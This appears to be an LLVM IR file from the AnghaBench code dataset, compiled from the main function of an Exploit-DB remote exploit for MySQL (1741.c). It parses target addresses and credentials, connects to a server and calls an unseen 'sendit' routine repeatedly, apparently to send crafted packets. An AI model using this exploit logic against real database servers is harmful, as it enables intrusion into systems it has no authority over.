; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1741.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1741.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_8__ = type { %struct.TYPE_7__ }
%struct.TYPE_7__ = type { i32 }

@.str = private unnamed_addr constant [17 x i8] c"/tmp/mysql2.sock\00", align 1
@opterr = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [18 x i8] c"s:t:a:P:Hh:u:p:ix\00", align 1
@c = common dso_local global i32 0, align 4
@optarg = common dso_local global i64 0, align 8
@tbl = common dso_local global i32 0, align 4
@thd = common dso_local global i32 0, align 4
@hexdump = common dso_local global i32 0, align 4
@conn = common dso_local global %struct.TYPE_8__* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"Can't connect, error : %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"using table_list:%x  thread:%x\0A\00", align 1
@fd = common dso_local global i32 0, align 4
@d = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [65535 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 3306, i32* %7, align 4
  store i32 1, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i8* null, i8** %12, align 8
  store i8* null, i8** %13, align 8
  store i8* null, i8** %14, align 8
  %17 = call i8* @strdup(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  store i8* %17, i8** %11, align 8
  store i64 0, i64* @opterr, align 8
  br label %18

18:                                               ; preds = %53, %2
  %19 = load i32, i32* %4, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = call i32 @getopt(i32 %19, i8** %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  store i32 %21, i32* @c, align 4
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %54

23:                                               ; preds = %18
  %24 = load i32, i32* @c, align 4
  switch i32 %24, label %52 [
    i32 115, label %25
    i32 116, label %28
    i32 97, label %32
    i32 117, label %36
    i32 112, label %39
    i32 80, label %42
    i32 104, label %45
    i32 105, label %48
    i32 120, label %49
    i32 72, label %50
  ]

25:                                               ; preds = %23
  %26 = load i64, i64* @optarg, align 8
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** %11, align 8
  br label %53

28:                                               ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = load i64, i64* @optarg, align 8
  %30 = call i64 @strtol(i64 %29, i32* null, i32 16)
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* @tbl, align 4
  br label %53

32:                                               ; preds = %23
  %33 = load i64, i64* @optarg, align 8
  %34 = call i64 @strtol(i64 %33, i32* null, i32 16)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* @thd, align 4
  br label %53

36:                                               ; preds = %23
  %37 = load i64, i64* @optarg, align 8
  %38 = inttoptr i64 %37 to i8*
  store i8* %38, i8** %12, align 8
  br label %53

39:                                               ; preds = %23
  %40 = load i64, i64* @optarg, align 8
  %41 = inttoptr i64 %40 to i8*
  store i8* %41, i8** %13, align 8
  br label %53

42:                                               ; preds = %23
  %43 = load i64, i64* @optarg, align 8
  %44 = call i32 @atoi(i64 %43)
  store i32 %44, i32* %7, align 4
  br label %53

45:                                               ; preds = %23
  %46 = load i64, i64* @optarg, align 8
  %47 = inttoptr i64 %46 to i8*
  store i8* %47, i8** %14, align 8
  br label %53

48:                                               ; preds = %23
  store i32 0, i32* %8, align 4
  br label %53

49:                                               ; preds = %23
  store i32 1, i32* @hexdump, align 4
  br label %53

50:                                               ; preds = %23
  %51 = call i32 (...) @usage()
  store i32 1, i32* %3, align 4
  br label %112

52:                                               ; preds = %23
  br label %53

53:                                               ; preds = %52, %49, %48, %45, %42, %39, %36, %32, %28, %25
  br label %18

54:                                               ; preds = %18
  %55 = load i32, i32* %9, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %60, label %57

57:                                               ; preds = %54
  %58 = load i32, i32* @thd, align 4
  %59 = add nsw i32 %58, 128328
  store i32 %59, i32* @tbl, align 4
  br label %60

60:                                               ; preds = %57, %54
  %61 = call %struct.TYPE_8__* @mysql_init(i32* null)
  store %struct.TYPE_8__* %61, %struct.TYPE_8__** @conn, align 8
  %62 = load %struct.TYPE_8__*, %struct.TYPE_8__** @conn, align 8
  %63 = load i8*, i8** %14, align 8
  %64 = load i8*, i8** %12, align 8
  %65 = load i8*, i8** %13, align 8
  %66 = load i8*, i8** %11, align 8
  %67 = call i32 @mysql_real_connect(%struct.TYPE_8__* %62, i8* %63, i8* %64, i8* %65, i32* null, i32 0, i8* %66, i32 0)
  store i32 %67, i32* %15, align 4
  %68 = load i32, i32* %15, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %75, label %70

70:                                               ; preds = %60
  %71 = load i32, i32* @stderr, align 4
  %72 = load %struct.TYPE_8__*, %struct.TYPE_8__** @conn, align 8
  %73 = call i8* @mysql_error(%struct.TYPE_8__* %72)
  %74 = call i32 @fprintf(i32 %71, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %73)
  store i32 1, i32* %3, align 4
  br label %112

75:                                               ; preds = %60
  %76 = load i32, i32* @tbl, align 4
  %77 = load i32, i32* @thd, align 4
  %78 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i32 %76, i32 %77)
  %79 = load %struct.TYPE_8__*, %struct.TYPE_8__** @conn, align 8
  %80 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %79, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  store i32 %82, i32* @fd, align 4
  %83 = load i32, i32* %8, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %95

85:                                               ; preds = %75
  store i32 2, i32* @d, align 4
  %86 = getelementptr inbounds [65535 x i8], [65535 x i8]* %10, i64 0, i64 0
  %87 = load i32, i32* %6, align 4
  %88 = call i32 @sendit(i8* %86, i32 %87, i32 -1)
  store i32 3, i32* @d, align 4
  %89 = getelementptr inbounds [65535 x i8], [65535 x i8]* %10, i64 0, i64 0
  %90 = load i32, i32* %6, align 4
  %91 = call i32 @sendit(i8* %89, i32 %90, i32 -1)
  store i32 3, i32* @d, align 4
  %92 = getelementptr inbounds [65535 x i8], [65535 x i8]* %10, i64 0, i64 0
  %93 = load i32, i32* %6, align 4
  %94 = call i32 @sendit(i8* %92, i32 %93, i32 -1)
  br label %108

95:                                               ; preds = %75
  store i32 3, i32* @d, align 4
  store i32 0, i32* %16, align 4
  br label %96

96:                                               ; preds = %104, %95
  %97 = load i32, i32* %16, align 4
  %98 = icmp slt i32 %97, 256
  br i1 %98, label %99, label %107

99:                                               ; preds = %96
  %100 = getelementptr inbounds [65535 x i8], [65535 x i8]* %10, i64 0, i64 0
  %101 = load i32, i32* %6, align 4
  %102 = load i32, i32* %16, align 4
  %103 = call i32 @sendit(i8* %100, i32 %101, i32 %102)
  br label %104

104:                                              ; preds = %99
  %105 = load i32, i32* %16, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %16, align 4
  br label %96

107:                                              ; preds = %96
  br label %108

108:                                              ; preds = %107, %85
  %109 = load %struct.TYPE_8__*, %struct.TYPE_8__** @conn, align 8
  %110 = call i32 @mysql_close(%struct.TYPE_8__* %109)
  %111 = call i32 @exit(i32 0) #3
  unreachable

112:                                              ; preds = %70, %50
  %113 = load i32, i32* %3, align 4
  ret i32 %113
}

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strtol(i64, i32*, i32) #1

declare dso_local i32 @atoi(i64) #1

declare dso_local i32 @usage(...) #1

declare dso_local %struct.TYPE_8__* @mysql_init(i32*) #1

declare dso_local i32 @mysql_real_connect(%struct.TYPE_8__*, i8*, i8*, i8*, i32*, i32, i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i8* @mysql_error(%struct.TYPE_8__*) #1

declare dso_local i32 @printf(i8*, i32, i32) #1

declare dso_local i32 @sendit(i8*, i32, i32) #1

declare dso_local i32 @mysql_close(%struct.TYPE_8__*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
